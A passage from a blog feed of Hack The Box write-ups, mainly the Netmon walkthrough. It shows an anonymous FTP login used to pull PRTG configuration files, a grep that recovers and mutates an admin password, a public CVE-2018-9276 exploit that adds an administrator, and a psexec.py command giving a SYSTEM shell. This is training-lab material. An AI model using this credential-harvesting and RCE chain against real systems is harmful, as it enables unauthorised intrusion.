&quot;CsBootROMSupported&quot;: null, &quot;CsBootStatus&quot;: null, &quot;CsBootupState&quot;: null, &quot;CsCaption&quot;: null, &quot;CsChassisBootupState&quot;: null, &quot;CsChassisSKUNumber&quot;: null, &quot;CsCurrentTimeZone&quot;: null, &quot;CsDaylightInEffect&quot;: null, &quot;CsDescription&quot;: null, &quot;CsDNSHostName&quot;: null, &quot;CsDomain&quot;: null, &quot;CsDomainRole&quot;: null, &quot;CsEnableDaylightSavingsTime&quot;: null, &quot;CsFrontPanelResetStatus&quot;: null, &quot;CsHypervisorPresent&quot;: null, &quot;CsInfraredSupported&quot;: null, &quot;CsInitialLoadInfo&quot;: null, &quot;CsInstallDate&quot;: null, &quot;CsKeyboardPasswordStatus&quot;: null, &quot;CsLastLoadInfo&quot;: null, &quot;CsManufacturer&quot;: null, &quot;CsModel&quot;: null, &quot;CsName&quot;: null, &quot;CsNetworkAdapters&quot;: null, &quot;CsNetworkServerModeEnabled&quot;: null, &quot;CsNumberOfLogicalProcessors&quot;: null, &quot;CsNumberOfProcessors&quot;: null, &quot;CsProcessors&quot;: null, &quot;CsOEMStringArray&quot;: null, &quot;CsPartOfDomain&quot;: null, &quot;CsPauseAfterReset&quot;: null, &quot;CsPCSystemType&quot;: null, &quot;CsPCSystemTypeEx&quot;: null, &quot;CsPowerManagementCapabilities&quot;: null, &quot;CsPowerManagementSupported&quot;: null, &quot;CsPowerOnPasswordStatus&quot;: null, &quot;CsPowerState&quot;: null, &quot;CsPowerSupplyState&quot;: null, &quot;CsPrimaryOwnerContact&quot;: null, &quot;CsPrimaryOwnerName&quot;: null, &quot;CsResetCapability&quot;: null, &quot;CsResetCount&quot;: null, &quot;CsResetLimit&quot;: null, &quot;CsRoles&quot;: null, &quot;CsStatus&quot;: null, &quot;CsSupportContactDescription&quot;: null, &quot;CsSystemFamily&quot;: null, &quot;CsSystemSKUNumber&quot;: null, &quot;CsSystemType&quot;: null, &quot;CsThermalState&quot;: null, &quot;CsTotalPhysicalMemory&quot;: null, &quot;CsPhyicallyInstalledMemory&quot;: null, &quot;CsUserName&quot;: null, &quot;CsWakeUpType&quot;: null, &quot;CsWorkgroup&quot;: null, &quot;OsName&quot;: null, &quot;OsType&quot;: null, &quot;OsOperatingSystemSKU&quot;: null, &quot;OsVersion&quot;: null, &quot;OsCSDVersion&quot;: null, &quot;OsBuildNumber&quot;: null, &quot;OsHotFixes&quot;: null, &quot;OsBootDevice&quot;: null, &quot;OsSystemDevice&quot;: null, &quot;OsSystemDirectory&quot;: null, &quot;OsSystemDrive&quot;: null, &quot;OsWindowsDirectory&quot;: null, &quot;OsCountryCode&quot;: null, &quot;OsCurrentTimeZone&quot;: null, &quot;OsLocaleID&quot;: null, &quot;OsLocale&quot;: null, &quot;OsLocalDateTime&quot;: null, &quot;OsLastBootUpTime&quot;: null, &quot;OsUptime&quot;: null, &quot;OsBuildType&quot;: null, &quot;OsCodeSet&quot;: null, &quot;OsDataExecutionPreventionAvailable&quot;: null, &quot;OsDataExecutionPrevention32BitApplications&quot;: null, &quot;OsDataExecutionPreventionDrivers&quot;: null, &quot;OsDataExecutionPreventionSupportPolicy&quot;: null, &quot;OsDebug&quot;: null, &quot;OsDistributed&quot;: null, &quot;OsEncryptionLevel&quot;: null, &quot;OsForegroundApplicationBoost&quot;: null, &quot;OsTotalVisibleMemorySize&quot;: null, &quot;OsFreePhysicalMemory&quot;: null, &quot;OsTotalVirtualMemorySize&quot;: null, &quot;OsFreeVirtualMemory&quot;: null, &quot;OsInUseVirtualMemory&quot;: null, &quot;OsTotalSwapSpaceSize&quot;: null, &quot;OsSizeStoredInPagingFiles&quot;: null, &quot;OsFreeSpaceInPagingFiles&quot;: null, &quot;OsPagingFiles&quot;: null, &quot;OsHardwareAbstractionLayer&quot;: null, &quot;OsInstallDate&quot;: null, &quot;OsManufacturer&quot;: null, &quot;OsMaxNumberOfProcesses&quot;: null, &quot;OsMaxProcessMemorySize&quot;: null, &quot;OsMuiLanguages&quot;: null, &quot;OsNumberOfLicensedUsers&quot;: null, &quot;OsNumberOfProcesses&quot;: null, &quot;OsNumberOfUsers&quot;: null, &quot;OsOrganization&quot;: null, &quot;OsArchitecture&quot;: null, &quot;OsLanguage&quot;: null, &quot;OsProductSuites&quot;: null, &quot;OsOtherTypeDescription&quot;: null, &quot;OsPAEEnabled&quot;: null, &quot;OsPortableOperatingSystem&quot;: null, &quot;OsPrimary&quot;: null, &quot;OsProductType&quot;: null, &quot;OsRegisteredUser&quot;: null, &quot;OsSerialNumber&quot;: null, &quot;OsServicePackMajorVersion&quot;: null, &quot;OsServicePackMinorVersion&quot;: null, &quot;OsStatus&quot;: null, &quot;OsSuites&quot;: null, &quot;OsServerLevel&quot;: 4, &quot;KeyboardLayout&quot;: null, &quot;TimeZone&quot;: &quot;(UTC-08:00) Pacific Time (US \u0026 Canada)&quot;, &quot;LogonServer&quot;: null, &quot;PowerPlatformRole&quot;: 1, &quot;HyperVisorPresent&quot;: null, &quot;HyperVRequirementDataExecutionPreventionAvailable&quot;: null, &quot;HyperVRequirementSecondLevelAddressTranslation&quot;: null, &quot;HyperVRequirementVirtualizationFirmwareEnabled&quot;: null, &quot;HyperVRequirementVMMonitorModeExtensions&quot;: null, &quot;DeviceGuardSmartStatus&quot;: 0, &quot;DeviceGuardRequiredSecurityProperties&quot;: null, &quot;DeviceGuardAvailableSecurityProperties&quot;: null, &quot;DeviceGuardSecurityServicesConfigured&quot;: null, &quot;DeviceGuardSecurityServicesRunning&quot;: null, &quot;DeviceGuardCodeIntegrityPolicyEnforcementStatus&quot;: null, &quot;DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus&quot;: null } /services lists the services, that’s also important and we might need it later : ``` root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/services [ { “name”: “AJRouter”, “startname”: “NT AUTHORITY\LocalService”, “displayname”: “AllJoyn Router Service”, “status”: “OK” }, { “name”: “ALG”, “startname”: “NT AUTHORITY\LocalService”, “displayname”: “Application Layer Gateway Service”, “status”: “OK” }, { “name”: “AppHostSvc”, “startname”: “localSystem”, “displayname”: “Application Host Helper Service”, “status”: “OK” },</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/hackback/0.png" /></entry><entry><title type="html">Hack The Box - Netmon</title><link href="http://localhost:4000/hack-the-box/netmon/" rel="alternate" type="text/html" title="Hack The Box - Netmon" /><published>2019-06-29T00:00:00+02:00</published><updated>2019-06-29T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/netmon</id><content type="html" xml:base="http://localhost:4000/hack-the-box/netmon/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-netmon-retired-and-heres-my-writeup-about-it-it-was-a-very-easy-machine-thats-everything-i-can-say-about-it-its-a-windows-box-and-its-ip-is-101010152-i-added-it-to-etchosts-as-netmonhtb-lets-jump-right-in-&quot;&gt;Hey guys today Netmon retired and here’s my writeup about it. It was a very easy machine that’s everything I can say about it. It’s a Windows box and its ip is 10.10.10.152, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;netmon.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/netmon/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC netmon.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/netmon/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-ftp-on-port-21-http-on-port-80-and-smb-the-most-interesting-thing-is-that-anonymous-login-is-allowed-on-ftp-and-obviously-its-running-on-c-&quot;&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; on port 21, &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on port 80 and &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;. The most interesting thing is that anonymous login is allowed on &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; and obviously it’s running on &lt;code class=&quot;highlighter-rouge&quot;&gt;C:&lt;/code&gt; !&lt;/h4&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;ftp-user-flag&quot;&gt;FTP, User Flag&lt;/h3&gt;
&lt;h4 id=&quot;i-checked-that-ftp-server-and-got-the-user-flag-for-public-&quot;&gt;I checked that &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; server and got the user flag for &lt;code class=&quot;highlighter-rouge&quot;&gt;Public&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/netmon# ftp netmon.htb
Connected to netmon.htb.
220 Microsoft FTP Service
Name (netmon.htb:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp&amp;gt; ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       &amp;lt;DIR&amp;gt;          inetpub
07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          PerfLogs
02-25-19  10:56PM       &amp;lt;DIR&amp;gt;          Program Files
02-03-19  12:28AM       &amp;lt;DIR&amp;gt;          Program Files (x86)
02-03-19  08:08AM       &amp;lt;DIR&amp;gt;          Users
02-25-19  11:49PM       &amp;lt;DIR&amp;gt;          Windows
226 Transfer complete.
ftp&amp;gt; cd Users
250 CWD command successful.
ftp&amp;gt; ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-25-19  11:44PM       &amp;lt;DIR&amp;gt;          Administrator
06-28-19  06:43AM       &amp;lt;DIR&amp;gt;          Public
226 Transfer complete.
ftp&amp;gt; cd Public
250 CWD command successful.
ftp&amp;gt; ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  08:05AM       &amp;lt;DIR&amp;gt;          Documents
07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          Downloads
07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          Music
07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          Pictures
06-28-19  06:49AM                   82 tester.txt
02-03-19  12:35AM                   33 user.txt
07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          Videos
226 Transfer complete.
ftp&amp;gt; get user.txt
local: user.txt remote: user.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
WARNING! 1 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
33 bytes received in 0.07 secs (0.4790 kB/s)
ftp&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/netmon/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-user&quot;&gt;We owned user.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h4 id=&quot;prtg-credentials&quot;&gt;PRTG Credentials&lt;/h4&gt;
&lt;h4 id=&quot;i-checked-the-http-service-and-found-a-web-application-called-prtg-network-monitor-however-we-need-credentials-to-access-the-application&quot;&gt;I checked the &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; service and found a web application called PRTG Network Monitor. However we need credentials to access the application.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/netmon/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-have-access-to-c-through-the-ftp-server-so-we-can-search-for-credentials-there-i-searched-for-the-place-where-prtg-configuration-files-are-saved-and-found-it-was-in-cusersall-usersapplication-datapaesslerprtg-network-monitor-so-i-went-there-and-downloaded-the-configuration-files-&quot;&gt;We have access to &lt;code class=&quot;highlighter-rouge&quot;&gt;C:&lt;/code&gt; through the &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; server so we can search for credentials there. I searched for the place where PRTG configuration files are saved and found it was in &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\All Users\Application Data\Paessler\PRTG Network Monitor&lt;/code&gt; so I went there and downloaded the configuration files :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/netmon# ftp netmon.htb
Connected to netmon.htb.
220 Microsoft FTP Service
Name (netmon.htb:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password. 
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp&amp;gt; cd Users
250 CWD command successful.
ftp&amp;gt; ls -la
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-25-19  11:44PM       &amp;lt;DIR&amp;gt;          Administrator
07-16-16  09:28AM       &amp;lt;DIR&amp;gt;          All Users
02-03-19  08:05AM       &amp;lt;DIR&amp;gt;          Default
07-16-16  09:28AM       &amp;lt;DIR&amp;gt;          Default User
07-16-16  09:16AM                  174 desktop.ini
06-28-19  06:43AM       &amp;lt;DIR&amp;gt;          Public
226 Transfer complete.
ftp&amp;gt; cd &quot;All Users&quot;
250 CWD command successful.
ftp&amp;gt; ls -al
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  08:05AM       &amp;lt;DIR&amp;gt;          Application Data
02-03-19  08:05AM       &amp;lt;DIR&amp;gt;          Desktop
02-03-19  08:05AM       &amp;lt;DIR&amp;gt;          Documents
02-03-19  12:15AM       &amp;lt;DIR&amp;gt;          Licenses
11-20-16  10:36PM       &amp;lt;DIR&amp;gt;          Microsoft
02-03-19  12:18AM       &amp;lt;DIR&amp;gt;          Paessler
02-03-19  08:05AM       &amp;lt;DIR&amp;gt;          regid.1991-06.com.microsoft
07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          SoftwareDistribution
02-03-19  08:05AM       &amp;lt;DIR&amp;gt;          Start Menu
02-03-19  12:15AM       &amp;lt;DIR&amp;gt;          TEMP
02-03-19  08:05AM       &amp;lt;DIR&amp;gt;          Templates
11-20-16  10:19PM       &amp;lt;DIR&amp;gt;          USOPrivate
11-20-16  10:19PM       &amp;lt;DIR&amp;gt;          USOShared
02-25-19  10:56PM       &amp;lt;DIR&amp;gt;          VMware
226 Transfer complete.
ftp&amp;gt; cd &quot;Application Data/Paessler/PRTG Network Monitor&quot;
250 CWD command successful.
ftp&amp;gt; ls -la
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  12:40AM       &amp;lt;DIR&amp;gt;          Configuration Auto-Backups
06-28-19  06:24AM       &amp;lt;DIR&amp;gt;          Log Database
02-03-19  12:18AM       &amp;lt;DIR&amp;gt;          Logs (Debug)
02-03-19  12:18AM       &amp;lt;DIR&amp;gt;          Logs (Sensors)
02-03-19  12:18AM       &amp;lt;DIR&amp;gt;          Logs (System)
06-28-19  06:24AM       &amp;lt;DIR&amp;gt;          Logs (Web Server)
02-25-19  08:01PM       &amp;lt;DIR&amp;gt;          Monitoring Database
06-28-19  06:54AM              1287578 PRTG Configuration.dat
02-25-19  10:54PM              1189697 PRTG Configuration.old
07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
06-28-19  06:25AM              1647701 PRTG Graph Data Cache.dat
02-25-19  11:00PM       &amp;lt;DIR&amp;gt;          Report PDFs
02-03-19  12:18AM       &amp;lt;DIR&amp;gt;          System Information Database
02-03-19  12:40AM       &amp;lt;DIR&amp;gt;          Ticket Database
02-03-19  12:18AM       &amp;lt;DIR&amp;gt;          ToDo Database
226 Transfer complete.
ftp&amp;gt; get &quot;PRTG Configuration.dat&quot;
local: PRTG Configuration.dat remote: PRTG Configuration.dat
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1287578 bytes received in 3.43 secs (366.5319 kB/s)
ftp&amp;gt; get &quot;PRTG Configuration.old&quot;
local: PRTG Configuration.old remote: PRTG Configuration.old
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1189697 bytes received in 3.05 secs (380.7779 kB/s)
ftp&amp;gt; get &quot;PRTG Configuration.old.bak&quot;
local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1153755 bytes received in 3.04 secs (370.2494 kB/s)
ftp&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;knowing-that-the-default-admin-user-for-prtg-is-prtgadmin-i-searched-for-that-string-in-the-3-configuration-files-&quot;&gt;Knowing that the default admin user for PRTG is &lt;code class=&quot;highlighter-rouge&quot;&gt;prtgadmin&lt;/code&gt; I searched for that string in the 3 configuration files :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cat * | grep -A 20 -B 20 &quot;prtgadmin&quot;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/netmon/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-got-the-password-which-was-prtgdmin2018-&quot;&gt;I got the password which was &lt;code class=&quot;highlighter-rouge&quot;&gt;PrTg@dmin2018&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/netmon/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;however-it-didnt-work-after-some-attempts-i-changed-it-to-prtgdmin2019-and-it-worked-&quot;&gt;However it didn’t work, after some attempts I changed it to &lt;code class=&quot;highlighter-rouge&quot;&gt;PrTg@dmin2019&lt;/code&gt; and it worked :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/netmon/6.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/netmon/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;rce-root-flag&quot;&gt;RCE, Root Flag&lt;/h3&gt;
&lt;h4 id=&quot;after-searching-for-authenticated-exploits-i-found-cve-2018-9276-which-was-an-authenticated-rce-vulnerability-i-used-this-exploit-which-exploits-the-rce-and-creates-a-new-administrator-user-this-works-because-prtg-runs-as-system-&quot;&gt;After searching for authenticated exploits I found &lt;a href=&quot;https://github.com/wildkindcc/CVE-2018-9276&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;CVE-2018-9276&lt;/code&gt;&lt;/a&gt; which was an authenticated &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt; vulnerability. I used &lt;a href=&quot;https://github.com/M4LV0/PRTG-Network-Monitor-RCE&quot;&gt;this exploit&lt;/a&gt; which exploits the &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt; and creates a new Administrator user (This works because PRTG runs as &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt;) :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/netmon/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;new-user-credentials--pentestp3nt3st-i-used-psexecpy-from-impacket-to-get-a-shell-&quot;&gt;New user credentials : &lt;code class=&quot;highlighter-rouge&quot;&gt;pentest:P3nT3st!&lt;/code&gt;. I used &lt;code class=&quot;highlighter-rouge&quot;&gt;psexec.py&lt;/code&gt; from &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;impacket&lt;/code&gt;&lt;/a&gt; to get a shell :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;psexec.py pentest:'P3nT3st!'@netmon.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/netmon/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---querier&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/querier/&quot;&gt;Hack The Box - Querier&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---hackback&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/hackback/&quot;&gt;Hack The Box - Hackback&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="ftp" /><category term="Windows Exploitation" /><category term="Web" /><category term="RCE" /><category term="smb" /><summary type="html">Quick Summary Hey guys today Netmon retired and here’s my writeup about it. It was a very easy machine that’s everything I can say about it. It’s a Windows box and its ip is 10.10.10.152, I added it to /etc/hosts as netmon.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC netmon.htb We got ftp on port 21, http on port 80 and smb. The most interesting thing is that anonymous login is allowed on ftp and obviously it’s running on C: ! FTP, User Flag I checked that ftp server and got the user flag for Public : root@kali:~/Desktop/HTB/boxes/netmon# ftp netmon.htb Connected to netmon.htb. 220 Microsoft FTP Service Name (netmon.htb:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp&amp;gt; ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 12:18AM 1024 .rnd 02-25-19 10:15PM &amp;lt;DIR&amp;gt; inetpub 07-16-16 09:18AM &amp;lt;DIR&amp;gt; PerfLogs 02-25-19 10:56PM &amp;lt;DIR&amp;gt; Program Files 02-03-19 12:28AM &amp;lt;DIR&amp;gt; Program Files (x86) 02-03-19 08:08AM &amp;lt;DIR&amp;gt; Users 02-25-19 11:49PM &amp;lt;DIR&amp;gt; Windows 226 Transfer complete. ftp&amp;gt; cd Users 250 CWD command successful. ftp&amp;gt; ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-25-19 11:44PM &amp;lt;DIR&amp;gt; Administrator 06-28-19 06:43AM &amp;lt;DIR&amp;gt; Public 226 Transfer complete. ftp&amp;gt; cd Public 250 CWD command successful. ftp&amp;gt; ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Documents 07-16-16 09:18AM &amp;lt;DIR&amp;gt; Downloads 07-16-16 09:18AM &amp;lt;DIR&amp;gt; Music 07-16-16 09:18AM &amp;lt;DIR&amp;gt; Pictures 06-28-19 06:49AM 82 tester.txt 02-03-19 12:35AM 33 user.txt 07-16-16 09:18AM &amp;lt;DIR&amp;gt; Videos 226 Transfer complete. ftp&amp;gt; get user.txt local: user.txt remote: user.txt 200 PORT command successful. 125 Data connection already open; Transfer starting. WARNING! 1 bare linefeeds received in ASCII mode File may not have transferred correctly. 226 Transfer complete. 33 bytes received in 0.07 secs (0.4790 kB/s) ftp&amp;gt; We owned user. PRTG Credentials I checked the http service and found a web application called PRTG Network Monitor. However we need credentials to access the application. We have access to C: through the ftp server so we can search for credentials there. I searched for the place where PRTG configuration files are saved and found it was in C:\Users\All Users\Application Data\Paessler\PRTG Network Monitor so I went there and downloaded the configuration files : root@kali:~/Desktop/HTB/boxes/netmon# ftp netmon.htb Connected to netmon.htb. 220 Microsoft FTP Service Name (netmon.htb:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp&amp;gt; cd Users 250 CWD command successful. ftp&amp;gt; ls -la 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-25-19 11:44PM &amp;lt;DIR&amp;gt; Administrator 07-16-16 09:28AM &amp;lt;DIR&amp;gt; All Users 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Default 07-16-16 09:28AM &amp;lt;DIR&amp;gt; Default User 07-16-16 09:16AM 174 desktop.ini 06-28-19 06:43AM &amp;lt;DIR&amp;gt; Public 226 Transfer complete. ftp&amp;gt; cd &quot;All Users&quot; 250 CWD command successful. ftp&amp;gt; ls -al 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Application Data 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Desktop 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Documents 02-03-19 12:15AM &amp;lt;DIR&amp;gt; Licenses 11-20-16 10:36PM &amp;lt;DIR&amp;gt; Microsoft 02-03-19 12:18AM &amp;lt;DIR&amp;gt; Paessler 02-03-19 08:05AM &amp;lt;DIR&amp;gt; regid.1991-06.com.microsoft 07-16-16 09:18AM &amp;lt;DIR&amp;gt; SoftwareDistribution 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Start Menu 02-03-19 12:15AM &amp;lt;DIR&amp;gt; TEMP 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Templates 11-20-16 10:19PM &amp;lt;DIR&amp;gt; USOPrivate 11-20-16 10:19PM &amp;lt;DIR&amp;gt; USOShared 02-25-19 10:56PM &amp;lt;DIR&amp;gt; VMware 226 Transfer complete. ftp&amp;gt; cd &quot;Application Data/Paessler/PRTG Network Monitor&quot; 250 CWD command successful. ftp&amp;gt; ls -la 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 12:40AM &amp;lt;DIR&amp;gt; Configuration Auto-Backups 06-28-19 06:24AM &amp;lt;DIR&amp;gt; Log Database 02-03-19 12:18AM &amp;lt;DIR&amp;gt; Logs (Debug) 02-03-19 12:18AM &amp;lt;DIR&amp;gt; Logs (Sensors) 02-03-19 12:18AM &amp;lt;DIR&amp;gt; Logs (System) 06-28-19 06:24AM &amp;lt;DIR&amp;gt; Logs (Web Server) 02-25-19 08:01PM &amp;lt;DIR&amp;gt; Monitoring Database 06-28-19 06:54AM 1287578 PRTG Configuration.dat 02-25-19 10:54PM 1189697 PRTG Configuration.old 07-14-18 03:13AM 1153755 PRTG Configuration.old.bak 06-28-19 06:25AM 1647701 PRTG Graph Data Cache.dat 02-25-19 11:00PM &amp;lt;DIR&amp;gt; Report PDFs 02-03-19 12:18AM &amp;lt;DIR&amp;gt; System Information Database 02-03-19 12:40AM &amp;lt;DIR&amp;gt; Ticket Database 02-03-19 12:18AM &amp;lt;DIR&amp;gt; ToDo Database 226 Transfer complete. ftp&amp;gt; get &quot;PRTG Configuration.dat&quot; local: PRTG Configuration.dat remote: PRTG Configuration.dat 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 1287578 bytes received in 3.43 secs (366.5319 kB/s) ftp&amp;gt; get &quot;PRTG Configuration.old&quot; local: PRTG Configuration.old remote: PRTG Configuration.old 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 1189697 bytes received in 3.05 secs (380.7779 kB/s) ftp&amp;gt; get &quot;PRTG Configuration.old.bak&quot; local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 1153755 bytes received in 3.04 secs (370.2494 kB/s) ftp&amp;gt; Knowing that the default admin user for PRTG is prtgadmin I searched for that string in the 3 configuration files : cat * | grep -A 20 -B 20 &quot;prtgadmin&quot; I got the password which was PrTg@dmin2018 : However it didn’t work, after some attempts I changed it to PrTg@dmin2019 and it worked : RCE, Root Flag After searching for authenticated exploits I found CVE-2018-9276 which was an authenticated RCE vulnerability. I used this exploit which exploits the RCE and creates a new Administrator user (This works because PRTG runs as system) : New user credentials : pentest:P3nT3st!. I used psexec.py from impacket to get a shell : psexec.py pentest:'P3nT3st!'@netmon.htb And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Querier Next Hack The Box write-up : Hack The Box - Hackback</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/netmon/0.png" /></entry><entry><title type="html">Hack The Box - Querier (Commando)</title><link href="http://localhost:4000/hack-the-box/querier-2/" rel="alternate" type="text/html" title="Hack The Box - Querier (Commando)" 